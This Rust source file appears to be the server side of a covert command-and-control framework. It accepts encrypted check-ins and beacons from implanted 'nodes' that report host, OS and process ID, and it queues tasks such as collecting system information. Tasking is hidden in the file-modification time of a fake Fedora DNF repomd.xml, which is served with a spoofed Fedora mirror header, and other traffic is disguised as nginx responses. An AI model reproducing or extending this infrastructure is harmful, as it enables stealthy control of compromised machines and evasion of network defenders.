use std::collections::HashMap;
use std::collections::VecDeque;
use std::io::Read;
use std::sync::Mutex;

use rand::Rng;

use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;
use base64::Engine;

use glimmer::crypto::{self, TimeBasedKey};
use glimmer::keystore::KeyStore;
use glimmer::proto::{Envelope, MsgType};

struct Server {
    keystore: KeyStore,
    nodes: Mutex<HashMap<String, TimeBasedKey>>,
    tasking: Mutex<HashMap<String, VecDeque<(u8, u16)>>>,
}

impl Server {
    fn new() -> Self {
        let keystore = KeyStore::load("keys").expect("failed to load keystore");
        Server {
            keystore,
            nodes: Mutex::new(HashMap::new()),
            tasking: Mutex::new(HashMap::new()),
        }
    }

    fn _get_pending_task(&self, node_id: &str) -> Option<(u8, u16)> {
        let mut tasking = self.tasking.lock().unwrap_or_else(|e| e.into_inner());
        tasking.get_mut(node_id).and_then(|q| q.pop_front())
    }

    fn queue_task(&self, node_id: &str, task_code: u8, args: u16) {
        let mut tasking = self.tasking.lock().unwrap_or_else(|e| e.into_inner());
        tasking
            .entry(node_id.to_string())
            .or_insert_with(VecDeque::new)
            .push_back((task_code, args));
        glimmer::dbg_log!(
            "[server] task queued node={} task=0x{:02x} args=0x{:03x}",
            node_id, task_code, args
        );
    }

    /// Apply the next pending task by modifying the repomd.xml file mtime.
    /// Called when it's safe to update the ETag (content update, or flexible mode).
    fn apply_next_task(&self) {
        let mut tasking = self.tasking.lock().unwrap_or_else(|e| e.into_inner());
        let nodes = self.nodes.lock().unwrap_or_else(|e| e.into_inner());

        for (node_id, queue) in tasking.iter_mut() {
            if let Some(&(task_code, args)) = queue.front() {
                if let Some(tbk) = nodes.get(node_id.as_str()) {
                    let path = "data/repomd.xml";
                    let metadata = match std::fs::metadata(path) {
                        Ok(m) => m,
                        Err(_) => continue,
                    };
                    let mtime = match metadata.modified() {
                        Ok(m) => m,
                        Err(_) => continue,
                    };
                    let mtime_us = match mtime.duration_since(std::time::UNIX_EPOCH) {
                        Ok(d) => d.as_micros() as u64,
                        Err(_) => continue,
                    };
                    let base_second = mtime_us / 1_000_000;

                    let key_mask = tbk.derive_from_epoch(base_second as i64);
                    let raw: u32 = (task_code as u32) | ((args as u32) << 8);
                    let encoded = (raw ^ (key_mask & 0xFFFFF)) % 1_000_000;

                    glimmer::dbg_log!(
                        "[server] apply_task: base_second={} key_mask=0x{:05x} raw=0x{:05x} encoded={}",
                        base_second, key_mask, raw, encoded
                    );

                    let new_mtime_us = (base_second * 1_000_000) + encoded as u64;
                    let new_mtime = filetime::FileTime::from_unix_time(
                        (new_mtime_us / 1_000_000) as i64,
                        ((new_mtime_us % 1_000_000) * 1000) as u32,
                    );
                    let atime = filetime::FileTime::from_last_access_time(&metadata);

                    if filetime::set_file_times(path, atime, new_mtime).is_ok() {
                        queue.pop_front();
                        glimmer::dbg_log!(
                            "[server] tasking assigned node={} task=0x{:02x} args=0x{:03x} mtime_us={}",
                            node_id, task_code, args, new_mtime_us
                        );
                    }
                    return; // One task per update cycle
                }
            }
        }
    }

}

fn main() {
    let addr = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "0.0.0.0:8080".into());

    let server = std::sync::Arc::new(Server::new());

    let listener = std::net::TcpListener::bind(&addr).unwrap();
    glimmer::dbg_log!("[server] listening on {}", addr);

    for stream in listener.incoming() {
        let stream = match stream {
            Ok(s) => s,
            Err(_e) => {
                glimmer::dbg_log!("[error] accept: {}", _e);
                continue;
            }
        };

        let server = server.clone();
        std::thread::spawn(move || {
            if let Err(_e) = handle_connection(stream, &server) {
                glimmer::dbg_log!("[error] connection: {}", _e);
            }
        });
    }
}

fn parse_body(body: &str) -> Option<(String, String)> {
    let mut data = None;
    let mut token = None;
    
    for param in body.split('&') {
        if let Some(val) = param.strip_prefix("data=") {
            data = Some(val.to_string());
        } else if let Some(val) = param.strip_prefix("token=") {
            token = Some(val.to_string());
        }
    }
    
    // token = key_id hex, data = encrypted payload base64
    Some((token?, data?))
}

fn handle_connection(
    mut stream: std::net::TcpStream,
    server: &Server,
) -> Result<(), Box<dyn std::error::Error>> {
    let (headers, body) = read_http_request(&mut stream)?;

    // Detect channel by request method
    let is_get = headers.starts_with("GET ");
    let is_repomd = headers.starts_with("GET /pub/fedora/linux/updates/42/Everything/x86_64/os/repodata/repomd.xml HTTP");

    glimmer::dbg_log!("[server] request headers={}", headers);
    glimmer::dbg_log!("[server] request is_get={} is_repomd={}", is_get, is_repomd);


    if is_get && is_repomd {
        return handle_dnf_channel(&mut stream, &headers, server);
    }

    // Fall through to existing HTTP POST channel
    let body = body.ok_or("no body in POST request")?;
    let body = body.trim();

    let (key_id_hex, payload_b64) = parse_body(&body)
        .ok_or("invalid body format")?;

    let key_id_bytes: [u8; 4] = hex::decode(&key_id_hex)?
        .try_into()
        .map_err(|_| "invalid key_id length")?;

    let decoded = BASE64.decode(&payload_b64)?;

    let node_id_hint = extract_node_id(&headers);
    // Look up server keypair by key_id
    let keypair = server
        .keystore
        .get(&key_id_bytes)
        .ok_or_else(|| format!("unknown key_id: {}", key_id_hex))?;

    // Try time-based + ECIES layered decryption for known nodes
    if let Some(ref nid) = node_id_hint {
        let nodes = server.nodes.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(tbk) = nodes.get(nid.as_str()) {
            // Outer layer: time-based
            if let Ok(inner) = tbk.decrypt_with_skew(&decoded, 2) {
                // Inner layer: ECIES
                if let Ok(plaintext) = crypto::decrypt_from_beacon(&inner, keypair) {
                    let envelope = Envelope::unmarshal(&plaintext)?;
                    let _ts = format_ts(envelope.timestamp);

                    match envelope.msg_type {
                        MsgType::Beacon => {
                            glimmer::dbg_log!(
                                "[server] beacon {} node={} key_id={} [http]",
                                _ts, envelope.node_id, key_id_hex
                            );
                        }
                        MsgType::Result => {
                            glimmer::dbg_log!(
                                "[server] result {} node={} payload={} bytes [http]",
                                _ts, envelope.node_id,
                                envelope.payload.as_ref().map(|p| p.len()).unwrap_or(0),
                            );
                        }
                        _ => {
                            glimmer::dbg_log!(
                                "[server] msg {} node={} type={:?} [http]",
                                _ts, envelope.node_id, envelope.msg_type
                            );
                        }
                    }
                    // Send a normal-looking response, content-length 0 on an http 200 is not ideal, will iterate later as we build out the concepts
                    let date = chrono::Utc::now().format("%a, %d %b %Y %H:%M:%S GMT");
                    let response = format!(
                        "HTTP/1.1 200 OK\r\n\
                        Date: {}\r\n\
                        Server: nginx/1.24.0\r\n\
                        Content-Type: text/html; charset=utf-8\r\n\
                        Content-Length: 0\r\n\
                        Connection: close\r\n\
                        X-Request-Id: {}\r\n\
                        \r\n",
                        date,
                        format!("{:032x}", rand::random::<u128>()),
                    );

                    std::io::Write::write_all(&mut stream, response.as_bytes())?;
                    return Ok(());
                }
            }
        }
    }

    // Not a known node - try as bootstrap checkin
    let (plaintext, _response_pub, root_secret) =
        crypto::bootstrap_decrypt(&decoded, keypair)?;

    let envelope = Envelope::unmarshal(&plaintext)?;
    let _ts = format_ts(envelope.timestamp);

    if let MsgType::Checkin = envelope.msg_type {
        if let Some(payload) = &envelope.payload {
            let _checkin: glimmer::proto::CheckinData = serde_json::from_slice(payload)?;
            glimmer::dbg_log!(
                "[server] checkin {} node={} os={}/{} host={} pid={} key_id={} [bootstrap]",
                _ts,
                envelope.node_id,
                _checkin.os,
                _checkin.arch,
                _checkin.host,
                _checkin.pid,
                key_id_hex,
            );

            {
                let tbk = TimeBasedKey::new(root_secret, 300);
                let mut nodes = server.nodes.lock().unwrap_or_else(|e| e.into_inner());
                nodes.insert(envelope.node_id.clone(), tbk);
                glimmer::dbg_log!("[server] time-based key established for node={}", envelope.node_id);
            }
            // immediately task node during dev work
            server.queue_task(&envelope.node_id, 0x02, 0x000); // task: collect sysinfo
            // In flexible mode, apply immediately (when it makes sense to do so, but independent of content updates). In paranoid mode, wait for content update.
            server.apply_next_task();
        }
    }

    let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
    std::io::Write::write_all(&mut stream, response.as_bytes())?;

    Ok(())
}

fn format_ts(timestamp: i64) -> String {
    chrono::DateTime::from_timestamp(timestamp, 0)
        .map(|t| t.format("%H:%M:%S").to_string())
        .unwrap_or_else(|| "???".into())
}

fn format_http_date(epoch_secs: u64) -> String {
    chrono::DateTime::from_timestamp(epoch_secs as i64, 0)
        .map(|t| t.format("%a, %d %b %Y %H:%M:%S GMT").to_string())
        .unwrap_or_else(|| "Thu, 01 Jan 1970 00:00:00 GMT".into())
}

fn extract_node_id(headers: &str) -> Option<String> {
    headers
        .lines()
        .find(|line| line.to_lowercase().starts_with("cookie:"))
        .and_then(|line| {
            let cookies = line.splitn(2, ':').nth(1)?.trim();
            cookies
                .split(';')
                .map(|c| c.trim())
                .find(|c| c.starts_with("sid="))
                .map(|c| c.trim_start_matches("sid=").to_string())
        })
}

fn read_http_request(
    stream: &mut std::net::TcpStream,
) -> Result<(String, Option<String>), Box<dyn std::error::Error>> {
    let mut headers_buf = Vec::new();
    let mut byte = [0u8; 1];

    loop {
        stream.read_exact(&mut byte)?;
        headers_buf.push(byte[0]);

        if headers_buf.len() >= 4
            && &headers_buf[headers_buf.len() - 4..] == b"\r\n\r\n"
        {
            break;
        }

        if headers_buf.len() > 8192 {
            return Err("headers too large".into());
        }
    }

    let headers = String::from_utf8_lossy(&headers_buf).to_string();

    let content_length = headers
        .lines()
        .find(|line| line.to_lowercase().starts_with("content-length:"))
        .and_then(|line| line.split(':').nth(1))
        .and_then(|v| v.trim().parse::<usize>().ok())
        .unwrap_or(0);

    if content_length == 0 {
        return Ok((headers, None));
    }

    if content_length > 1 << 20 {
        return Err("body too large".into());
    }

    let mut body = vec![0u8; content_length];
    stream.read_exact(&mut body)?;

    Ok((headers, Some(String::from_utf8(body)?)))
}


fn handle_dnf_channel(
    stream: &mut std::net::TcpStream,
    _headers: &str,
    _server: &Server,
) -> Result<(), Box<dyn std::error::Error>> {
    glimmer::dbg_log!("[server] dnf poll received");

    // Read repomd.xml from disk at runtime
    let path = "data/repomd.xml";
    let repomd = std::fs::read_to_string(path)?;
    let metadata = std::fs::metadata(path)?;
    let mtime = metadata.modified()?;
    let mtime_us = mtime.duration_since(std::time::UNIX_EPOCH)?.as_micros() as u64;
    let size = metadata.len();

    // Generate Apache-style ETag from real file metadata
    let etag = format!("\"{:x}-{:x}\"", size, mtime_us);
    let last_modified = format_http_date(mtime_us / 1_000_000);

    let date = chrono::Utc::now().format("%a, %d %b %Y %H:%M:%S GMT");
    let response = format!(
        "HTTP/1.1 200 OK\r\n\
         Content-Type: text/xml\r\n\
         Content-Length: {}\r\n\
         Date: {}\r\n\
         Server: Apache\r\n\
         Accept-Ranges: bytes\r\n\
         AppTime: D={}\r\n\
         Content-Security-Policy: default-src 'none'; img-src 'self'\r\n\
         ETag: {}\r\n\
         Last-Modified: {}\r\n\
         Referrer-Policy: same-origin\r\n\
         Strict-Transport-Security: max-age=31536000; preload\r\n\
         X-Content-Type-Options: nosniff\r\n\
         X-Fedora-AppServer: dl03.rdu3.fedoraproject.org\r\n\
         X-Frame-Options: DENY\r\n\
         X-XSS-Protection: 1; mode=block\r\n\
         Connection: keep-alive\r\n\
         \r\n{}",
        repomd.len(),
        date,
        rand::thread_rng().gen_range(800..2000),
        etag,
        last_modified,
        repomd,
    );

    std::io::Write::write_all(stream, response.as_bytes())?;
    Ok(())
}
